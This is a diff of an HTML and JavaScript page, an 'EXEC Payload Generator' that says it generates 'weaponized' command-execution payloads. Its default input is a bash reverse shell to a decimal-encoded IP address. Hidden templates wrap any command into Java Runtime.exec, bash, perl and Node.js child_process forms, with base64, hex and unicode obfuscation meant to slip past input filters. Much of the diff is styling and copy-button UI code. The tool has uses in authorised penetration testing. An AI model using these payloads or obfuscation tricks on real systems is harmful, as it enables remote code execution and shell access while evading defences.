@@ -1,18 +1,425 @@
-<html>
+<!DOCTYPE html>
+<html lang="zh-CN">
 
 <head>
     <meta charset="utf-8">
-    <title>exec</title>
-    <link rel="stylesheet" type="text/css" href="../css/bootstrap.min.css">
+    <title>命令变形工具 - 1135</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <link rel="icon" type="image/x-icon" href="../../favicon.ico">
+    <link rel="stylesheet" type="text/css" href="../../css/style.css">
+
+    <style>
+        /* Page Specific Overrides */
+        .main-content {
+            padding: 40px 20px;
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+
+        .tool-header {
+            text-align: center;
+            margin-bottom: 40px;
+            padding: 40px;
+            background: var(--surface-color);
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .tool-header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: var(--primary-color);
+            box-shadow: var(--shadow-glow);
+        }
+
+        .tool-header h1 {
+            color: var(--primary-color);
+            font-family: var(--font-mono);
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .tool-header p {
+            color: var(--text-secondary);
+        }
+
+        /* Form Elements */
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .input-block {
+            margin-bottom: 20px;
+        }
+
+        .form-label,
+        .input-block label {
+            display: block;
+            margin-bottom: 8px;
+            color: var(--primary-color);
+            font-weight: bold;
+            font-size: 0.9rem;
+        }
+
+        .form-control,
+        .input-block input {
+            width: 100%;
+            padding: 12px 15px;
+            background: var(--bg-color);
+            border: 1px solid var(--border-color);
+            color: var(--text-primary);
+            font-family: var(--font-mono);
+            font-size: 0.9rem;
+            transition: all 0.3s ease;
+            border-radius: 0;
+        }
+
+        /* Bold font for your_cmd input */
+        #your_cmd {
+            font-weight: bold;
+        }
+
+        .form-control:focus,
+        .input-block input:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: var(--shadow-glow);
+        }
+
+        textarea.form-control {
+            min-height: 80px;
+            max-height: 600px;
+            overflow-y: auto;
+            resize: vertical;
+        }
+
+        /* Code Output Blocks */
+        .output-block {
+            background: var(--bg-color);
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            padding: 15px;
+            margin-bottom: 20px;
+            position: relative;
+            transition: all 0.3s ease;
+        }
+
+        .output-block:hover {
+            border-color: var(--primary-color);
+            box-shadow: var(--shadow-glow);
+        }
+
+        .output-block h3 {
+            color: var(--primary-color);
+            font-size: 1rem;
+            margin-bottom: 10px;
+            font-family: var(--font-mono);
+        }
+
+        .output-block pre {
+            margin: 0;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            font-family: var(--font-mono);
+            font-size: 14px;
+            color: var(--text-primary);
+            max-height: 800px;
+            overflow-y: auto;
+        }
+
+        .output-block code {
+            font-family: inherit;
+        }
+
+        .copy-btn {
+            padding: 4px 8px;
+            background: var(--primary-color);
+            color: var(--bg-color);
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 11px;
+            margin-left: 8px;
+            vertical-align: middle;
+            transition: background 0.3s ease;
+        }
+
+        .copy-btn:hover {
+            background: var(--primary-hover);
+        }
+
+        .code-with-copy {
+            position: relative;
+            margin: 8px 0;
+        }
+
+        /* Copy button inside code-with-copy: hidden by default, shown on hint-code hover */
+        .code-with-copy .copy-btn {
+            position: absolute;
+            top: 5px;
+            right: 5px;
+            z-index: 10;
+            opacity: 0;
+            transition: opacity 0.3s ease, background 0.3s ease;
+            pointer-events: auto;
+            margin-left: 0;
+            padding: 4px 8px;
+            background: var(--primary-color);
+            color: var(--bg-color);
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 11px;
+        }
+
+        .code-with-copy .copy-btn:hover {
+            background: var(--primary-hover);
+        }
+
+        .hint-code {
+            position: relative;
+            margin: 0;
+        }
+        
+        .hint-section .hint-code {
+            background: var(--bg-color);
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            padding: 10px;
+            margin: 8px 0;
+            overflow-x: auto;
+        }
+
+        /* Hint sections styling */
+        .hint-section {
+            margin-bottom: 20px;
+            padding: 15px;
+            background: rgba(0, 255, 65, 0.05);
+            border-left: 3px solid var(--primary-color);
+            border-radius: 4px;
+        }
+
+        /* Light theme hint section background */
+        [data-theme="gray"] .hint-section {
+            background: rgba(0, 0, 0, 0.03);
+        }
+
+        .hint-section strong {
+            color: var(--primary-color);
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        .hint-section p {
+            color: var(--text-secondary);
+            margin: 8px 0;
+            line-height: 1.6;
+        }
+
+        /* Divider */
+        hr {
+            border: 0;
+            height: 1px;
+            background: var(--border-color);
+            margin: 40px 0;
+        }
+
+        /* Hint Modal */
+        .hint-lightbulb {
+            position: fixed;
+            bottom: 80px;
+            /* raised from 20px */
+            right: 20px;
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(135deg, var(--primary-color), var(--accent-color));
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(0, 255, 65, 0.4);
+            z-index: 9998;
+            transition: all 0.3s ease;
+            animation: pulse 2s infinite;
+        }
+
+        .hint-lightbulb:hover {
+            transform: scale(1.1);
+            box-shadow: 0 6px 20px rgba(0, 255, 65, 0.6);
+        }
+
+        .hint-lightbulb::before {
+            content: '💡';
+            font-size: 24px;
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                box-shadow: 0 4px 12px rgba(0, 255, 65, 0.4);
+            }
+
+            50% {
+                box-shadow: 0 4px 20px rgba(0, 255, 65, 0.7);
+            }
+        }
+
+        .interactive-hint {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0, 0, 0, 0.9);
+            backdrop-filter: blur(5px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .interactive-hint.show {
+            display: flex;
+        }
+
+        .hint-content {
+            background: var(--surface-color);
+            padding: 40px;
+            border: 1px solid var(--primary-color);
+            box-shadow: var(--shadow-glow);
+            max-width: 600px;
+            margin: 0 20px;
+            text-align: center;
+            position: relative;
+        }
+
+        .hint-content::before {
+            content: 'SYSTEM_MESSAGE';
+            position: absolute;
+            top: -10px;
+            left: 20px;
+            background: var(--surface-color);
+            padding: 0 10px;
+            color: var(--primary-color);
+            font-size: 0.8rem;
+        }
+
+        .hint-content h2 {
+            color: var(--primary-color);
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+        }
+
+        .hint-content ul {
+            text-align: left;
+            color: var(--text-primary);
+            margin-bottom: 30px;
+            list-style: none;
+        }
+
+        .hint-content li::before {
+            content: '> ';
+            color: var(--primary-color);
+        }
+
+        .hint-close {
+            background: transparent;
+            color: var(--primary-color);
+            border: 1px solid var(--primary-color);
+            padding: 10px 30px;
+            font-family: var(--font-mono);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+        }
+
+        .hint-close:hover {
+            background: var(--primary-color);
+            color: #000;
+            box-shadow: var(--shadow-glow);
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+    </style>
 </head>
 
 <body>
+    <!-- 导航栏 -->
+    <div id="navigation-container"></div>
+    <script>
+        // Load Navigation asynchronously to avoid blocking and CORS issues
+        (function() {
+            const navContainer = document.getElementById('navigation-container');
+            if (!navContainer) return;
+            
+            // Try fetch first (works in most modern browsers)
+            if (typeof fetch !== 'undefined') {
+                fetch('../../navigation.html')
+                    .then(response => {
+                        if (response.ok) {
+                            return response.text();
+                        }
+                        throw new Error('Network response was not ok');
+                    })
+                    .then(html => {
+                        navContainer.innerHTML = html;
+                    })
+                    .catch(error => {
+                        console.warn('Failed to load navigation via fetch:', error);
+                        // Fallback to async XHR
+                        loadNavigationAsync();
+                    });
+            } else {
+                // Fallback to async XHR for older browsers
+                loadNavigationAsync();
+            }
+            
+            function loadNavigationAsync() {
+                try {
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('GET', '../../navigation.html', true); // Async
+                    xhr.onload = function() {
+                        if (xhr.status === 200 || xhr.status === 0) { // 0 for file:// protocol
+                            navContainer.innerHTML = xhr.responseText;
+                        }
+                    };
+                    xhr.onerror = function() {
+                        console.warn('Failed to load navigation via XHR');
+                    };
+                    xhr.send();
+                } catch(e) {
+                    console.warn('Failed to load navigation:', e);
+                }
+            }
+        })();
+    </script>
 
-    <!-- payloads template -->
+    <!-- 主要内容 -->
+    <div class="main-content">
 
-    <textarea id="data0" hidden="true">arr0w1_cmd_origin</textarea>
+        <!-- payloads template (Hidden) -->
+        <textarea id="data0" hidden="true">arr0w1_cmd_origin</textarea>
 
-    <textarea id="data1" hidden="true">
+        <textarea id="data1" hidden="true">
 1⃣️ 参数类型 String[]
 java.lang.Runtime.getRuntime().exec​(String[] cmdarray)    
 Executes the specified command and arguments in a separate process.
@@ -24,7 +431,7 @@ java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","echo '123' > ~/
 java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","arr0w1_cmd_origin"});
 </textarea>
 
-    <textarea id="data2" hidden="true">
+        <textarea id="data2" hidden="true">
 2⃣️ 参数类型 String
 参数类型: 字符串
 如 Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
@@ -40,7 +447,7 @@ java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","arr0w1_cmd_orig
 /bin/bash -c $*|bash 0 arr0w1_cmd_origin
 </textarea>
 
-    <textarea id="data3" hidden="true">
+        <textarea id="data3" hidden="true">
 3⃣️ base64编码 - 使用base64命令
 支持Linux 不支持macOS
 🔥实际payload
@@ -60,7 +467,7 @@ perl -MMIME::Base64 -e 'exec decode_base64("arr0w1_base64")'
 `echo -e "ascii_2_Hex_without_black_chars_flag"`
 </textarea>
 
-    <textarea id="data4" hidden="true">
+        <textarea id="data4" hidden="true">
 如
 require('child_process').exec('echo \'asd\' > ~/Downloads/11111.txt');//
 require('\x63hild_process').exec('/System/Applications/Calculator.app/Contents/MacOS/Cal\u0063ulator')
@@ -82,204 +489,564 @@ require('\x63hild_process').exec(Buffer.from('arr0w1_base64', 'base64').toString
 
 </textarea>
 
-    <textarea id="data5" hidden="true">
+        <textarea id="data5" hidden="true">
 </textarea>
 
-    <textarea id="data6" hidden="true">
+        <textarea id="data6" hidden="true">
 </textarea>
 
-    <!-- ----------------- -->
+        <!-- ----------------- -->
 
-    <main role="main">
-        <section class="jumbotron text-center g-light">
-            <div class="container">
-                <h1>exec</h1>
-                <p class="lead text-muted">Generate weaponized Command Execution payloads.</p>
+        <main role="main">
+            <section class="tool-header">
+                <h1>EXEC Payload Generator</h1>
+                <p>Generate weaponized Command Execution payloads.</p>
+            </section>
+
+            <div class="input-block">
+                <label for="your_cmd"><strong>The command you want to execute:</strong></label>
+                <input type="text" id="your_cmd" value="/bin/bash -i >& /dev/tcp/181614338/6666 0>&1"
+                    oninput="func_oninput()" autofocus
+                    onfocus="var temp_value=this.value; this.value=''; this.value=temp_value" />
             </div>
-            <br>
 
-            <p class="font-weight-bold">The command you want to execute:</p>
-            <input type="text" id="your_cmd" value="/bin/bash -i >& /dev/tcp/181614338/6666 0>&1"
-                oninput="func_oninput()" class="form-control text-white bg-dark" autofocus
-                onfocus="var temp_value=this.value; this.value=''; this.value=temp_value" />
+            <hr>
 
-            <br>
+            <div class="output-block" style="display: none;" id="payload0-container">
+                <h3>0 - Original Command</h3>
+                <div class="hint-section">
+                    <strong>Base Command</strong>
+                    <div class="code-with-copy">
+                        <button class="copy-btn" onclick="copyPayload('payload0', this)" style="opacity: 0;">Copy</button>
+                        <pre class="hint-code"><code id="payload0"></code></pre>
+                    </div>
+                </div>
+            </div>
 
-            <hr> <!-- ---------- -->
+                <div class="output-block" id="payload1-container">
+                <h3>1 - Java (String[])</h3>
+                <p style="color: var(--text-secondary); font-size: 0.8rem; margin-bottom: 10px;">
+                    java.lang.Runtime.getRuntime().exec​(String[] cmdarray)</p>
+            </div>
 
-            <p class="font-weight-bold" style="display: none;">原始命令</p>
+                <div class="output-block" id="payload2-container">
+                <h3>2 - Java (String)</h3>
+                <p style="color: var(--text-secondary); font-size: 0.8rem; margin-bottom: 10px;">
+                    java.lang.Runtime.getRuntime().exec("command")</p>
+            </div>
 
-            <textarea id="payload0" class="form-control" style="display: none; rows=" 1"></textarea>
+                <div class="output-block" id="payload3-container">
+                <h3>3 - Shell (Encoding)</h3>
+                <p style="color: var(--text-secondary); font-size: 0.8rem; margin-bottom: 10px;">Base64 / Hex / Obfuscation</p>
+            </div>
 
-            <br>
-            <br>
-            1 Java
-            <p class="font-weight-bold">java.lang.Runtime.getRuntime().exec​(以下内容); // 参数类型 String[]</p>
-            <textarea id="payload1" class="form-control" rows="3"></textarea>
+                <div class="output-block" id="payload4-container">
+                <h3>4 - Node.js</h3>
+                <p style="color: var(--text-secondary); font-size: 0.8rem; margin-bottom: 10px;">child_process.exec()</p>
+            </div>
 
-            <br>
-            <br>
-            2 Java
-            <p class="font-weight-bold">java.lang.Runtime.getRuntime().exec("以下内容"); // 参数类型 String </p>
-            <textarea id="payload2" class="form-control" rows="3"></textarea>
+                <div class="output-block" id="payload5-container">
+                <h3>5 - Temp</h3>
+            </div>
 
-            <br>
-            <br>
-            3 shell
-            <p class="font-weight-bold">Encoding</p>
-            <textarea id="payload3" class="form-control" rows="3"></textarea>
+                <div class="output-block" id="payload6-container">
+                <h3>6 - Temp</h3>
+            </div>
 
-            <br>
-            <br>
-            4 node.js
-            <p class="font-weight-bold"> exec </p>
-            <textarea id="payload4" class="form-control" rows="3"></textarea>
+        </main>
+    </div>
 
-            <br>
-            <br>
-            5
-            <p class="font-weight-bold">temp </p>
-            <textarea id="payload5" class="form-control" rows="3"></textarea>
+    <!-- Hint Lightbulb -->
+    <div class="hint-lightbulb" onclick="toggleHint(event)" title="View Help"></div>
 
-            <br>
-            <br>
-            6
-            <p class="font-weight-bold">temp </p>
-            <textarea id="payload6" class="form-control" rows="3"></textarea>
+    <!-- Hint Modal -->
+    <div id="interactive-hint" class="interactive-hint"
+        style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.9); backdrop-filter: blur(5px); display: none; align-items: center; justify-content: center; z-index: 9999;">
+        <div class="hint-content"
+            style="background: var(--surface-color); padding: 40px; border-radius: 8px; border: 1px solid var(--primary-color); max-width: 600px; max-height: 80vh; overflow-y: auto;">
+            <h2 style="color: var(--primary-color); margin-bottom: 20px;">🔧 EXEC Payload Generator 使用说明</h2>
+            <p style="margin-bottom: 15px;">本工具帮助生成各种命令执行payload：</p>
+            <ul style="margin-bottom: 20px; padding-left: 20px;">
+                <li>支持多种编码格式（Unicode、Hex、Base64）</li>
+                <li>自动生成多种payload变体</li>
+                <li>一键复制到剪贴板</li>
+            </ul>
+            <button
+                style="width: 100%; padding: 12px; background: var(--primary-color); color: #000; border: none; cursor: pointer;"
+                onclick="toggleHint(event)">关闭</button>
+        </div>
+    </div>
 
-        </section>
-    </main>
-
-    <footer class="text-muted">
+    <footer>
         <div class="container">
-            <p class="float-right">
-                <a href="#">Back to TOP</a>
-            </p>
-            <p>arr0w1</p>
+            <p>arr0w1 | 1135</p>
         </div>
     </footer>
 
-</body>
-
-
-<script>
-
-    // -----
-
-    // get elements - hiddened
-    element_data0 = document.getElementById("data0");
-    element_data1 = document.getElementById("data1");
-    element_data2 = document.getElementById("data2");
-    element_data3 = document.getElementById("data3");
-    element_data4 = document.getElementById("data4");
-    element_data5 = document.getElementById("data5");
-    element_data6 = document.getElementById("data6");
-
-    // get datas
-    var data0 = element_data0.value;
-    var data1 = element_data1.value;
-    var data2 = element_data2.value;
-    var data3 = element_data3.value;
-    var data4 = element_data4.value;
-    var data5 = element_data5.value;
-    var data6 = element_data6.value;
-
-    // -----
-
-    //textarea增高 随内容自动增加textarea的高度
-    function auto_grow(element) {
-        element.style.height = "5px";
-        element.style.height = (element.scrollHeight) + "px";
-    }
-
-    // -----
-
-
-    function ascii_2_Hex(str) {
-        var re = /[\u4E00-\u9FA5]/;
-        var ar = [];
-        for (var i = 0; i < str.length; i++) {
-            var a = '';
-            if (re.test(str.charAt(i))) { // 中文
-                a = encodeURI(str.charAt(i)).replace(/%/g, '');
-            } else {
-                a = "\\x" + str.charCodeAt(i).toString(16);
-            }
-            ar.push(a);
-        }
-        str = ar.join("");
-        return str;
-    }
-
-    function ascii_2_Hex_without_black_chars(str) {
-        var regex_black_chars = /([<>|&;])/g;
-        var str_array = str.split(regex_black_chars);
-        // 排除 black_chars 如果命令里有这些字符,hex编码后的命令无法执行!
-
-        var allstr = "";
-        str_array.forEach(
-            function (one) {
-                if (one.match(regex_black_chars) && one != "") {
-                    one = one.replace(regex_black_chars, "\"`$&`echo -e \""); // $& 是被匹配的字符串本身
-                } else {
-                    one = ascii_2_Hex(one);
+    <!-- Scripts -->
+    <script src="../../js/main.js"></script>
+    <script>
+        // Navigation is already loaded, just ensure language is applied
+                if (typeof applyLanguage === 'function') {
+                    applyLanguage(localStorage.getItem('lang') || 'zh');
                 }
-                allstr += one;
-            }
-        );
 
-        return allstr.replace(/`echo -e ""`/g, "").replace(/`echo -e "\x20"`/g, " "); // 去除无意义的字符
-    }
+        // Toggle hint modal with click-outside-to-close
+        function toggleHint(event) {
+            if (event) event.stopPropagation();
+            const hint = document.getElementById('interactive-hint');
+            const isVisible = hint.style.display === 'flex';
+            hint.style.display = isVisible ? 'none' : 'flex';
 
-    // 生成不带=的base64字符串
-    function func_wise_btoa(str1) {
-        //原理:在原始js语句后加空格 直到生成的base64字符串没有空格
-        while (1) {
-            if (btoa(str1).indexOf("=") == -1) {//  等号不存在
-                return btoa(str1);
+            // Add click listener to close on outside click
+            if (!isVisible) {
+                setTimeout(() => {
+                    document.addEventListener('click', closeHintOnOutsideClick);
+                }, 0);
             } else {
-                str1 = str1 + " ";
+                document.removeEventListener('click', closeHintOnOutsideClick);
+            }
+        }
+
+        function closeHintOnOutsideClick(event) {
+            const hint = document.getElementById('interactive-hint');
+            const hintContent = hint.querySelector('.hint-content');
+
+            // Check if click is outside the hint content
+            if (!hintContent.contains(event.target)) {
+                hint.style.display = 'none';
+                document.removeEventListener('click', closeHintOnOutsideClick);
+            }
+        }
+
+        // -----
+
+        // get elements - hiddened
+        element_data0 = document.getElementById("data0");
+        element_data1 = document.getElementById("data1");
+        element_data2 = document.getElementById("data2");
+        element_data3 = document.getElementById("data3");
+        element_data4 = document.getElementById("data4");
+        element_data5 = document.getElementById("data5");
+        element_data6 = document.getElementById("data6");
+
+        // get datas
+        var data0 = element_data0.value;
+        var data1 = element_data1.value;
+        var data2 = element_data2.value;
+        var data3 = element_data3.value;
+        var data4 = element_data4.value;
+        var data5 = element_data5.value;
+        var data6 = element_data6.value;
+
+        // -----
+
+        //textarea增高 随内容自动增加textarea的高度
+        function auto_grow(element) {
+            // No longer needed, using pre/code blocks
+        }
+
+        // Copy payload safely
+        function copyPayload(id, btnElement) {
+            const element = document.getElementById(id);
+            if (!element) {
+                console.error(`Element with id "${id}" not found`);
+                return;
+            }
+            const text = element.textContent;
+            navigator.clipboard.writeText(text).then(() => {
+                // Visual feedback
+                if (btnElement) {
+                    const originalText = btnElement.textContent;
+                    btnElement.textContent = 'Copied!';
+                setTimeout(() => {
+                        btnElement.textContent = originalText;
+                }, 1500);
+                }
+            }).catch(err => {
+                console.error('Failed to copy:', err);
+            });
+        }
+
+        // Make copyPayload available globally for onclick handlers
+        window.copyPayload = copyPayload;
+
+        // -----
+
+
+        function ascii_2_Hex(str) {
+            var re = /[\u4E00-\u9FA5]/;
+            var ar = [];
+            for (var i = 0; i < str.length; i++) {
+                var a = '';
+                if (re.test(str.charAt(i))) { // 中文
+                    a = encodeURI(str.charAt(i)).replace(/%/g, '');
+                } else {
+                    a = "\\x" + str.charCodeAt(i).toString(16);
+                }
+                ar.push(a);
+            }
+            str = ar.join("");
+            return str;
+        }
+
+        function ascii_2_Hex_without_black_chars(str) {
+            var regex_black_chars = /([<>|&;])/g;
+            var str_array = str.split(regex_black_chars);
+            // 排除 black_chars 如果命令里有这些字符,hex编码后的命令无法执行!
+
+            var allstr = "";
+            str_array.forEach(
+                function (one) {
+                    if (one.match(regex_black_chars) && one != "") {
+                        one = one.replace(regex_black_chars, "\"`$&`echo -e \""); // $& 是被匹配的字符串本身
+                    } else {
+                        one = ascii_2_Hex(one);
+                    }
+                    allstr += one;
+                }
+            );
+
+            return allstr.replace(/`echo -e ""`/g, "").replace(/`echo -e "\x20"`/g, " "); // 去除无意义的字符
+        }
+
+        // 生成不带=的base64字符串
+        function func_wise_btoa(str1) {
+            //原理:在原始js语句后加空格 直到生成的base64字符串没有空格
+            while (1) {
+                if (btoa(str1).indexOf("=") == -1) {//  等号不存在
+                    return btoa(str1);
+                } else {
+                    str1 = str1 + " ";
+                }
+
+            }
+        }
+
+        // Function to display payload with multiple commands, each with its own copy button
+        function displayPayloadWithCommands(payloadId, payloadData) {
+            const container = document.getElementById(payloadId + '-container');
+            if (!container) return;
+
+            // Remove old content
+            const oldCodeWrapper = container.querySelector('.code-with-copy');
+            if (oldCodeWrapper) oldCodeWrapper.remove();
+            
+            const codeWrapper = document.createElement('div');
+            codeWrapper.className = 'code-with-copy';
+
+            // Split by lines
+            const lines = payloadData.split('\n').map(line => line.trim()).filter(line => line.length > 0);
+            
+            // Find command lines (lines starting with 🔥 or containing actual commands)
+            const commandLines = [];
+            
+            lines.forEach((line, index) => {
+                // Check if this is a command line - more comprehensive detection
+                const isCommand = line.startsWith('🔥') || 
+                                 (line.length > 5 && 
+                                  (line.includes('exec(') || 
+                                   line.includes('Runtime') || 
+                                   line.includes('/bin/') || 
+                                   line.includes('require(') ||
+                                   line.includes('perl') ||
+                                   line.includes('bash') ||
+                                   line.includes('echo') ||
+                                   line.includes('sh -c') ||
+                                   line.includes('cmd.exe') ||
+                                   line.includes('powershell') ||
+                                   line.startsWith('`') ||
+                                   line.startsWith('$') ||
+                                   line.startsWith('(') ||
+                                   line.includes('arr0w1_') ||
+                                   line.match(/^[a-zA-Z_][a-zA-Z0-9_]*\s*\(/))); // Function calls
+                
+                if (isCommand) {
+                    // Extract command (remove 🔥 prefix and description)
+                    let command = line;
+                    let label = `Command ${commandLines.length + 1}`;
+                    
+                    if (line.startsWith('🔥')) {
+                        // Extract label and command
+                        const parts = line.split(/🔥/);
+                        if (parts.length > 1) {
+                            const afterFire = parts.slice(1).join('🔥');
+                            // Try to extract label before the command
+                            const labelMatch = afterFire.match(/^([^：:]+)[：:]/);
+                            if (labelMatch) {
+                                label = labelMatch[1].trim();
+                                command = afterFire.substring(labelMatch[0].length).trim();
+                            } else {
+                                // Check if there's a description in brackets
+                                const bracketMatch = afterFire.match(/^([^【]+)【/);
+                                if (bracketMatch) {
+                                    label = bracketMatch[1].trim();
+                                    command = afterFire.substring(bracketMatch[0].length).trim();
+                                } else {
+                                    command = afterFire;
+                                }
+                            }
+                        }
+                    }
+                    
+                    commandLines.push({ command: command.trim(), label: label });
+                }
+            });
+            
+            // If no commands detected, treat each non-empty line as a potential command
+            if (commandLines.length === 0 && lines.length > 0) {
+                lines.forEach((line, index) => {
+                    if (line.length > 0) {
+                        commandLines.push({ 
+                            command: line, 
+                            label: `Line ${index + 1}` 
+                        });
+                    }
+                });
             }
 
+            if (commandLines.length > 1) {
+                // Display as multiple hint-sections
+                commandLines.forEach((item, index) => {
+                    const hintSection = document.createElement('div');
+                    hintSection.className = 'hint-section';
+                    
+                    const strong = document.createElement('strong');
+                    strong.textContent = item.label;
+
+                    const cmdWrapper = document.createElement('div');
+                    cmdWrapper.className = 'code-with-copy';
+                    cmdWrapper.style.position = 'relative';
+
+                    const copyBtn = document.createElement('button');
+                    copyBtn.className = 'copy-btn';
+                    copyBtn.textContent = 'Copy';
+                    copyBtn.onclick = function(e) {
+                        e.stopPropagation();
+                        navigator.clipboard.writeText(item.command).then(() => {
+                            const originalText = copyBtn.textContent;
+                            copyBtn.textContent = 'Copied!';
+                            setTimeout(() => {
+                                copyBtn.textContent = originalText;
+                            }, 1500);
+                        }).catch(err => {
+                            console.error('Failed to copy:', err);
+                        });
+                    };
+
+                    const pre = document.createElement('pre');
+                    pre.className = 'hint-code';
+                    const code = document.createElement('code');
+                    code.textContent = item.command;
+                    pre.appendChild(code);
+
+                    // Add hover effect to show copy button when hovering over hint-code
+                    pre.addEventListener('mouseenter', function () {
+                        copyBtn.style.opacity = '1';
+                    });
+                    pre.addEventListener('mouseleave', function () {
+                        copyBtn.style.opacity = '0';
+                    });
+                    // Also show when hovering over the button itself
+                    copyBtn.addEventListener('mouseenter', function () {
+                        copyBtn.style.opacity = '1';
+                    });
+                    copyBtn.addEventListener('mouseleave', function () {
+                        copyBtn.style.opacity = '0';
+                    });
+
+                    cmdWrapper.appendChild(copyBtn);
+                    cmdWrapper.appendChild(pre);
+
+                    hintSection.appendChild(strong);
+                    hintSection.appendChild(cmdWrapper);
+                    codeWrapper.appendChild(hintSection);
+                });
+            } else if (commandLines.length === 1) {
+                // Single command - display as one code block
+                const copyBtn = document.createElement('button');
+                copyBtn.className = 'copy-btn';
+                copyBtn.textContent = 'Copy';
+                copyBtn.onclick = function(e) {
+                    e.stopPropagation();
+                    navigator.clipboard.writeText(commandLines[0].command).then(() => {
+                        const originalText = copyBtn.textContent;
+                        copyBtn.textContent = 'Copied!';
+                        setTimeout(() => {
+                            copyBtn.textContent = originalText;
+                        }, 1500);
+                    }).catch(err => {
+                        console.error('Failed to copy:', err);
+                    });
+                };
+
+                const pre = document.createElement('pre');
+                pre.className = 'hint-code';
+                const code = document.createElement('code');
+                code.id = payloadId;
+                code.textContent = commandLines[0].command;
+                pre.appendChild(code);
+
+                // Add hover effect to show copy button when hovering over hint-code
+                pre.addEventListener('mouseenter', function () {
+                    copyBtn.style.opacity = '1';
+                });
+                pre.addEventListener('mouseleave', function () {
+                    copyBtn.style.opacity = '0';
+                });
+                // Also show when hovering over the button itself
+                copyBtn.addEventListener('mouseenter', function () {
+                    copyBtn.style.opacity = '1';
+                });
+                copyBtn.addEventListener('mouseleave', function () {
+                    copyBtn.style.opacity = '0';
+                });
+
+                codeWrapper.appendChild(copyBtn);
+                codeWrapper.appendChild(pre);
+            } else {
+                // No commands found, display full content
+                const copyBtn = document.createElement('button');
+                copyBtn.className = 'copy-btn';
+                copyBtn.textContent = 'Copy';
+                copyBtn.onclick = function(e) {
+                    e.stopPropagation();
+                    const codeEl = document.getElementById(payloadId);
+                    if (codeEl) {
+                        copyPayload(payloadId, copyBtn);
+                    } else {
+                        navigator.clipboard.writeText(payloadData).then(() => {
+                            const originalText = copyBtn.textContent;
+                            copyBtn.textContent = 'Copied!';
+                            setTimeout(() => {
+                                copyBtn.textContent = originalText;
+                            }, 1500);
+                        });
+                    }
+                };
+
+                const pre = document.createElement('pre');
+                pre.className = 'hint-code';
+                const code = document.createElement('code');
+                code.id = payloadId;
+                code.textContent = payloadData;
+                pre.appendChild(code);
+
+                // Add hover effect to show copy button when hovering over hint-code
+                pre.addEventListener('mouseenter', function () {
+                    copyBtn.style.opacity = '1';
+                });
+                pre.addEventListener('mouseleave', function () {
+                    copyBtn.style.opacity = '0';
+                });
+                // Also show when hovering over the button itself
+                copyBtn.addEventListener('mouseenter', function () {
+                    copyBtn.style.opacity = '1';
+                });
+                copyBtn.addEventListener('mouseleave', function () {
+                    copyBtn.style.opacity = '0';
+                });
+
+                codeWrapper.appendChild(copyBtn);
+                codeWrapper.appendChild(pre);
+            }
+
+            container.appendChild(codeWrapper);
         }
-    }
 
-    var func_oninput = function () {
+        var func_oninput = function () {
+            try {
+            var cmd_origin = document.getElementById("data0").value.replace("arr0w1_cmd_origin", document.getElementById("your_cmd").value);
 
-        var cmd_origin = document.getElementById("data0").value.replace("arr0w1_cmd_origin", document.getElementById("your_cmd").value);
+            var cmd_origin_btoa_ed = func_wise_btoa(cmd_origin);
 
-        var cmd_origin_btoa_ed = func_wise_btoa(cmd_origin);
+                // Payload 0 - Original command
+                const payload0El = document.getElementById("payload0");
+                if (payload0El) {
+                    payload0El.textContent = cmd_origin;
+                }
 
-        // -------
-        // 设置/替换 textarea的内容
-        document.getElementById("payload0").value = cmd_origin;
+                // Process each payload
+                const payload1Data = data1.replace(/arr0w1_cmd_origin/g, cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
+                displayPayloadWithCommands('payload1', payload1Data);
 
-        // 全部匹配 /g
-        document.getElementById("payload1").value = data1.replace(/arr0w1_cmd_origin/g, cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
+                const payload2Data = data2.replace(/arr0w1_cmd_origin/g, cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
+                displayPayloadWithCommands('payload2', payload2Data);
 
-        document.getElementById("payload2").value = data2.replace(/arr0w1_cmd_origin/g, cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
+                const payload3Data = data3.replace(/ascii_2_Hex_without_black_chars_flag/g, ascii_2_Hex_without_black_chars(cmd_origin))
+                    .replace(/arr0w1_cmd_ascii2hex/g, ascii_2_Hex(cmd_origin))
+                    .replace(/arr0w1_cmd_origin/g, cmd_origin)
+                    .replace(/arr0w1_base64/g, cmd_origin_btoa_ed)
+                    .replace(/arr0w1_cmd_origin/g, cmd_origin.replace(/\'/g, "\\'"));
